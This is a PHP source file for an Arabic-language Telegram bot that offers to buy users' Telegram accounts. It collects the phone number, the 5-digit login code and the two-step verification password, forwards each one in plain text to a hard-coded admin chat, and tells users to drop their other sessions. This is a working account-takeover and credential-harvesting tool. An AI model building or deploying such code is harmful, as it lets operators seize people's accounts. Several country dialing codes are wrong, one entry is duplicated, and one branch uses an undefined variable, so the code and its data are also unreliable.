<?php

$iD_admin = "7012394737"; # ايدي الأدمن

# عند اختيار قسم "بيع الحسابات" @YAS_Nl
if($data == "Sellingaccounts") {
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "
<b>مرحبًا بك عزيزي : 💙 $first 💙</b> 🏠
<b>▱▱▱▱▱▱▱▱▱☠▱▱▱▱▱▱▱▱▱</b>
<blockquote>✅ هذه قسم بيع حسابات تيليجرام</blockquote>
<blockquote>• ارسل الرقم الذي تريد ان ابيعه الان ❤️‍🩹</blockquote>
",
'parse_mode' => "html",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => '- رجوع 🔙', 'callback_data' => 'back']], 
]
])
]);
file_put_contents("data/id/$id/step.txt", "wait_for_number");
}
// قائمة رموز الدول مع الأسماء والأعلام مع الاسعار @YAS_Nl
$country_codes = [
'+1' => ['name' => 'امريكا', 'flag' => '🇺🇸', 'prise' => '5₽'],
'+20' => ['name' => 'مصر', 'flag' => '🇪🇬', 'prise' => '6₽'],
'+245' => ['name' => 'كينيا', 'flag' => '🇰🇪', 'prise' => '5₽'],
'+213' => ['name' => 'جزائر', 'flag' => '🇩🇿', 'prise' => '5₽'],
'+966' => ['name' => 'السعودية', 'flag' => '🇸🇦', 'prise' => '10₽'],
'+249' => ['name' => 'السودان', 'flag' => '🇸🇩', 'prise' => '5₽'],
'+972' => ['name' => 'اسرائيل', 'flag' => '👞🇮🇱', 'prise' => '6₽'],
'+63' => ['name' => 'الفلبين', 'flag' => '🇵🇭', 'prise' => '5₽'],
'+53' => ['name' => 'كوبا', 'flag' => '🇨🇺', 'prise' => '5₽'],
'+974' => ['name' => 'قطر', 'flag' => '🇶🇦', 'prise' => '10₽'],
'+506' => ['name' => 'كوستاريكا', 'flag' => '🇨🇷', 'prise' => '6₽'],
'+386' => ['name' => 'سليفونيا', 'flag' => '🇸🇮', 'prise' => '6₽'],
'+977' => ['name' => 'نيبال', 'flag' => '🇳🇵', 'prise' => '6₽'],
'+504' => ['name' => 'هندورس', 'flag' => '🇭🇳', 'prise' => '7₽'],
'+676' => ['name' => 'تونجو', 'flag' => '🇹🇴', 'prise' => '6₽'],
'+95' => ['name' => 'مينيمار', 'flag' => '🇲🇲', 'prise' => '6₽'],
'+63' => ['name' => 'الفلبين', 'flag' => '🇵🇭', 'prise' => '6₽'],
'+992' => ['name' => 'طاجيكستان', 'flag' => '🇹🇯', 'prise' => '6₽'],
'+45' => ['name' => 'الدنيمارك', 'flag' => '🇩🇰', 'prise' => '6₽'],
'+62' => ['name' => 'إندونيسيا', 'flag' => '🇮🇩', 'prise' => '5₽'],
'+233' => ['name' => 'غانا', 'flag' => '🇬🇭', 'prise' => '6₽'],
'+265' => ['name' => 'ملاوي', 'flag' => '🇲🇼', 'prise' => '6₽'],
'+56' => ['name' => 'شيلي', 'flag' => '🇨🇱', 'prise' => '6₽'],
'+967' => ['name' => 'اليمن', 'flag' => '🇾🇪', 'prise' => '6₽'],
'+964' => ['name' => 'العراق', 'flag' => '🇮🇶', 'prise' => '6₽'],
'+48' => ['name' => 'بولندا', 'flag' => '🇵🇱', 'prise' => '5₽'],
'+44' => ['name' => 'بريطانيا', 'flag' => '🇬🇧', 'prise' => '5₽'],
'+7' => ['name' => 'روسيا', 'flag' => '🇷🇺', 'prise' => '5₽'],
'+371' => ['name' => 'لاتيفيا', 'flag' => '🇱🇻', 'prise' => '5₽'],
'+46' => ['name' => 'السويد', 'flag' => '🇸🇪', 'prise' => '5₽'],
'+212' => ['name' => 'المغرب', 'flag' => '🇲🇦', 'prise' => '5₽'],
'+27' => ['name' => 'جنوب افريقيا', 'flag' => '🇿🇦', 'prise' => '5₽'],
'+381' => ['name' => 'صربيا', 'flag' => '🇷🇸', 'prise' => '5₽'],
'+55' => ['name' => 'البرازيل', 'flag' => '🇧🇷', 'prise' => '6₽'],
'+50' => ['name' => 'بيرو', 'flag' => '🇵🇪', 'prise' => '5₽'],
'+244' => ['name' => 'انغولا', 'flag' => '🇦🇴', 'prise' => '5₽'],
'+90' => ['name' => 'تركيا', 'flag' => '🇹🇷', 'prise' => '5₽'],
'+66' => ['name' => 'تايلاند', 'flag' => '🇹🇭', 'prise' => '5₽'],
'+971' => ['name' => 'الامارات', 'flag' => '🇦🇪', 'prise' => '15₽'],
'+968' => ['name' => 'عمان', 'flag' => '🇴🇲', 'prise' => '8₽'],
'+93' => ['name' => 'أفغانستان', 'flag' => '🇦🇫', 'prise' => '6₽'],
'+52' => ['name' => 'المكسيك', 'flag' => '🇲🇽', 'prise' => '6₽'],
'+89' => ['name' => 'إيران', 'flag' => '🇮🇷', 'prise' => '6₽'],
'+39' => ['name' => 'ايطاليا', 'flag' => '🇮🇹', 'prise' => '5₽'],
'+33' => ['name' => 'فرنسا', 'flag' => '🇫🇷', 'prise' => '5₽'],
'+216' => ['name' => 'تونس', 'flag' => '🇹🇳', 'prise' => '6₽'],
'+963' => ['name' => 'سوريا', 'flag' => '🇸🇾', 'prise' => '6₽'],
'+962' => ['name' => 'الأردن', 'flag' => '🇯🇴', 'prise' => '8₽'],
'+965' => ['name' => 'الكويت', 'flag' => '🇰🇼', 'prise' => '19₽'],
'+218' => ['name' => 'ليبيا', 'flag' => '🇱🇾', 'prise' => '8₽'],
'+970' => ['name' => 'فلسطين', 'flag' => '🇵🇸', 'prise' => '8₽'],
    // أضف باقي رموز الدول هنا... @YAS_Nl
];

// دالة لاستخراج رمز الدولة @YAS_Nl
function get_country_info($number, $country_codes) {
foreach ($country_codes as $code => $info) {
if (strpos($number, $code) === 0) {
return $info;
}
}
return null;
}

if ($text && file_get_contents("data/id/$id/step.txt") == "wait_for_number") {
if (is_numeric($text)) {
$client_number = trim($text);
$country_info = get_country_info($client_number, $country_codes);

if ($country_info) {
$country_name = $country_info['name'];
$country_flag = $country_info['flag'];
$country_prise = $country_info['prise'];

bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
<b>تم استلام الرقم بنجاح ✅</b>

<blockquote>رقمك : <code>$client_number</code></blockquote>
<blockquote>الدولة : $country_name $country_flag</blockquote>
<blockquote>سعر الرقم : $country_prise </blockquote>
<blockquote>جاري التحقق من رقمك الآن ✅</blockquote>
",
'parse_mode' => "html"
]);

// إرسال الرقم والمعلومات إلى الأدمن @YAS_Nl
bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>طلب بيع رقم جديد 📤 :</b>

<b>رقم العميل :</b> <code>$client_number</code>
<b>الدولة :</b> $country_name $country_flag
<b>سعر الرقم : $country_prise </b>
<blockquote>يرجى اتخاذ الإجراءات اللازمة.</blockquote>

<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "✅ موافقة", 'callback_data' => "approve_number|$chat_id|$client_number"],['text' => "❌ رفض", 'callback_data' => "reject_number|$chat_id"]],
[['text' => "📩 طلب الكود", 'callback_data' => "request_code|$chat_id|$client_number"],['text' => "✅ تم التسجيل", 'callback_data' => "Itwas_number|$chat_id"]],
[['text' => "❌ فشل تسجيل الدخول", 'callback_data' => "registration_Login|$chat_id"],['text' => "✅ طلب التحقق بخطوتين", 'callback_data' => "step_verification|$chat_id"]],
[['text' => "❌ لسه يوجد بعض الجلسات", 'callback_data' => "Itws_umber|$chat_id"]],
[['text'=>"✅ - معرف الذي طلب بيع الرقم - ✅",'url'=>"tg://openmessage?user_id=$chat_id"]],      
]
])
]);
} else {
// في حال كان الرقم غير مدعوم @YAS_Nl
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
<b>عذرًا، الدولـة الخاصة بالرقم غير مدعومة. لا يمكننا قبول هذا الرقم.</b>
",
'parse_mode' => "html"
]);
}
unlink("data/id/$id/step.txt");
} else {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
<b>عذرًا، الرقم الذي أدخلته غير صالح. يرجى المحاولة مرة أخرى.</b>
",
'parse_mode' => "html"
]);
}
}

# زر رفض الطلب @YAS_Nl
if(strpos($data, "reject_number|") === 0) {
list(, $user_chat_id) = explode('|', $data);

bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>عزيزي العميل الرقم الذي ادخلته غير صحيح</b>
<blockquote>يرجى اعاده المحاوله ❤️‍🩹</blockquote>
",
'parse_mode' => "html"
]);

bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم ارسال رفض الرقم للعميل</b>

<b>مطور الملف : @YAS_Nl </b>
",
'parse_mode' => "html"
]);
}
# زر موافقة الطلب @YAS_Nl
if(strpos($data, "approve_number|") === 0) {
list(, $user_chat_id, $client_number) = explode('|', $data);

bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>ممتاز تم التحقق من رقمك وجاري طلب الكود الان</b>
<blockquote>سيتم إشعارك عند الإرسال...</blockquote>
",
'parse_mode' => "html"
]);

bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم ارسال رساله الموافقه على الرقم</b>
<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html"
]);
}

# عند اختيار طلب الكود @YAS_Nl
if(strpos($data, "request_code|") === 0) {
list(, $user_chat_id) = explode('|', $data);

bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>تم إرسال الكود التحقق إليك ارسل الكود هكذا 1 2 3 4 5</b>
<blockquote>يرجى إدخال الكود المكون من 5 أرقام لتسجيل الدخول</blockquote>
",
'parse_mode' => "html"
]);

bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم طلب الكود من العميل بنجاح ✅</b>
",
'parse_mode' => "html"
]);

// تسجيل حالة العضو في ملف خاص 
file_put_contents("data/id/$user_chat_id/step.txt", "awaiting_code");
}
# استقبال الرقم من العميل @YAS_Nl
if($text && file_get_contents("data/id/$chat_id/step.txt") == "awaiting_code") {
$entered_code = trim($text);

if(strlen($entered_code) == 5 && is_numeric($entered_code)) {
// إرسال الكود إلى الإدارة
bot('sendMessage', [
'chat_id' => $iD_admin,
 'text' => "
<b>كود التحقق المرسل من العميل :</b> <code>$entered_code</code>
",
'parse_mode' => "html"
]);
// إبلاغ العضو بأنه تم استلام الكود
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "<b>جاري تسجيل الدخول...</b>",
'parse_mode' => "html"
]);
 // إرسال الكود إلى الأدمن
bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>طلب جديد من العميل:</b>
<b>الكود المرسل :</b> <code>$entered_code</code>
<blockquote>يرجى اتخاذ الإجراءات اللازمة.</blockquote>
<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => "✅ موافقة", 'callback_data' => "approve_number|$chat_id|$client_number"],['text' => "❌ رفض", 'callback_data' => "reject_number|$chat_id"]],
[['text' => "📩 طلب الكود", 'callback_data' => "request_code|$chat_id|$client_number"],['text' => "✅ تم التسجيل", 'callback_data' => "Itwas_number|$chat_id"]],
[['text' => "❌ فشل تسجيل الدخول", 'callback_data' => "registration_Login|$chat_id"],['text' => "✅ طلب التحقق بخطوتين", 'callback_data' => "step_verification|$chat_id"]],
[['text' => "❌ لسه يوجد بعض الجلسات", 'callback_data' => "Itws_umber|$chat_id"]],
[['text'=>"✅ - معرف الذي طلب بيع الرقم - ✅",'url'=>"tg://openmessage?user_id=$chat_id"]],        
]
])
]);
} else {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "<b>عذراً، الكود غير صحيح. يرجى إدخال 5 أرقام صحيحة.</b>",
'parse_mode' => "html"
]);
}
}
# زر فشل تسجيل @YAS_Nl
if (strpos($data, "registration_Login|") === 0) {
list(, $user_chat_id) = explode('|', $data);

bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>حدث خطا يرجى اعاده المحاوله</b>
<blockquote>سوف يتم طلب الكود مجددا ❤️‍🩹</blockquote>
",
'parse_mode' => "html"
]);

bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم ارسال العميل فشل في تسجيل الدخول</b>

<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html"
]);
file_put_contents("data/id/$id/step.txt", "awaiting_code");
}

# زر تم تسجيل الدخول @YAS_Nl
if (strpos($data, "Itwas_number|") === 0) {
list(, $user_chat_id) = explode('|', $data);
// إرسال رسالة للمستخدم
bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>تم تسجيل الدخول بنجاح ✅</b>
<blockquote>يرجى الآن تسجيل الخروج من حسابك ❤️‍🩹</blockquote>
<b>ارسل الايدي الخاص بك</b>
",
'parse_mode' => "html"
]);
// إعلام المسؤول بأن المستخدم سجل الدخول
bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم تسجيل دخول العميل بنجاح</b> ✅
<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html"
]);
// تغيير حالة المستخدم إلى "في انتظار الآيدي"
file_put_contents("data/id/$user_chat_id/step.txt", "awaiting_user_id");
}
# استقبال الآيدي من المستخدم وإرساله إلى المسؤول
if($text && file_get_contents("data/id/$chat_id/step.txt") == "awaiting_user_id") {
 $user_id = trim($text);
// إرسال الآيدي للمسؤول
bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم استلام الآيدي من العميل :</b>
<code>$user_id</code>
<b>معرف التليجرام الخاص بالعميل :</b> <code>$chat_id</code>
<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html"
 ]);
// تأكيد الاستلام للمستخدم
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "<b>جاري شحن حسابك الان انتظر... ✅</b>",
'parse_mode' => "html"
]);
// حذف حالة المستخدم
unlink("data/id/$chat_id/step.txt");
}

# زر يوجد جلسات @YAS_Nl
if (strpos($data, "Itws_umber|") === 0) {
list(, $user_chat_id) = explode('|', $data);

bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>عذرا عزيزي العميل هناك بعض الجلسات</b>
<blockquote>يرجى ان تسجل خروج من جميع الجلسات التي في الحساب ❤️‍🩹</blockquote>
",
'parse_mode' => "html"
]);

bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم ارسال للعميل هناك بعض الجلسات</b>
<b>مطور الملف : @YAS_Nl</b>
",
'parse_mode' => "html"
]);
}
# عند اختيار طلب التحقق بخطوتين @YAS_Nl
if(strpos($data, "step_verification|") === 0) {
list(, $user_chat_id) = explode('|', $data);
bot('sendMessage', [
'chat_id' => $user_chat_id,
'text' => "
<b>تم اكتشاف أن الحساب محمي بكلمة مرور</b>
<blockquote>يرجى إرسال كلمة المرور أو رمز التحقق لاكتمال العملية ✅</blockquote>
",
'parse_mode' => "html"
]);
bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم طلب التحقق بخطوتين من العميل بنجاح ✅</b>
",
'parse_mode' => "html"
]);
// تسجيل حالة العضو في ملف خاص @YAS_Nl
file_put_contents("data/id/$user_chat_id/step.txt", "awaiting_verification");
}
# استقبال كلمة المرور أو رمز التحقق من العميل @YAS_Nl
if ($text && file_get_contents("data/id/$chat_id/step.txt") == "awaiting_verification") {
$entered_value = trim($text);
// إرسال كلمة المرور أو رمز التحقق إلى الإدارة @YAS_Nl
bot('sendMessage', [
'chat_id' => $iD_admin,
'text' => "
<b>تم استلام كلمة المرور من العميل بنجاح ✅
التحقق بخطوتين : </b><code>$entered_value</code>
",
'parse_mode' => "html"
]);
// إبلاغ العميل بالانتظار @YAS_Nl
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
<b>تم استلام كلمة المرور الخاصة بك، يرجى الانتظار بينما يتم التحقق...</b>
",
'parse_mode' => "html"
]);
// تحديث الحالة (مثلاً "pending_verification") @YAS_Nl
file_put_contents("data/id/$chat_id/step.txt", "pending_verification");
}
?>